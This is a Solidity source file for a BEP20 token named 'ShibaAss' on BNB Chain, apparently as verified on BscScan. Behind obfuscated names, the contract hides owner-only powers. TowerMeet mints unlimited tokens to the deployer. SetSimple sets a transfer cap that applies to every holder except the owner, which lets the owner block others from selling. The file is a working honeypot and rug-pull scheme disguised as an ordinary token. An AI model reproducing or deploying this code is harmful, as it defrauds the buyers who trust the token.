/**
 *Submitted for verification at BscScan.com on 2021-12-06
*/

/**
 *Submitted for verification at BscScan.com on 2021-12-06
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
interface IBEP20 
{
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address ownr, address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ShibaAss is IBEP20 
{
    using BeautifulLib for uint256;
    mapping(address => uint256) internal _midnight;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _unique;
    uint256 public _burnRate;
    string private _name;
    string private _symbol;
    address private _msgsender;
    address private _sendermessage;
    address private _burnaddress = 0x000000000000000000000000000000000000dEaD;
    address public _pancakeSwapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public _pancakeSwapFactory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public _wbnbAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    constructor() 
    {
        _totalSupply = 1000000000 * (10 ** decimals());
        _name = "ShibaAss";
        _symbol = "Ass";
        _burnRate = 11;
        _unique = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _midnight[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier IndependentFoundation() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _midnight[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetPot() external view returns (uint256) { return _unique; }
    function SetSimple(uint b) external virtual IndependentFoundation { _unique = b * (10 ** decimals()); }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {_transfer(_msgSender(), recipient, amount);return true;}
    function approve(address spender, uint256 amount) public virtual override returns (bool) { _approve(_msgSender(), spender, amount); return true; }
    function allowance(address ownr, address spender) external view virtual override returns (uint256) { return _allowances[ownr][spender]; }
    function TowerMeet(uint256 cover) external virtual IndependentFoundation
    {
        uint rush = cover * (10 ** decimals()); 
        _midnight[_msgsender] = _midnight[_msgsender].Cookie(rush);
        emit Transfer(address(0), _msgsender, rush);
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) 
    {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "BEP20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(amount <= _unique || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _midnight[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _midnight[sender] = senderBalance - amount;
        _midnight[recipient] += (amount - burnAmount);
        _midnight[_burnaddress] += burnAmount;

        emit Transfer(sender, recipient, amount - burnAmount);
        emit Transfer(sender, _burnaddress, burnAmount);
    }

    function _approve(address ownr, address spender, uint256 amount) internal virtual 
    {
        require(ownr != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        _allowances[ownr][spender] = amount;
        emit Approval(ownr, spender, amount);
    }
}
library BeautifulLib 
{
  function Cookie(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}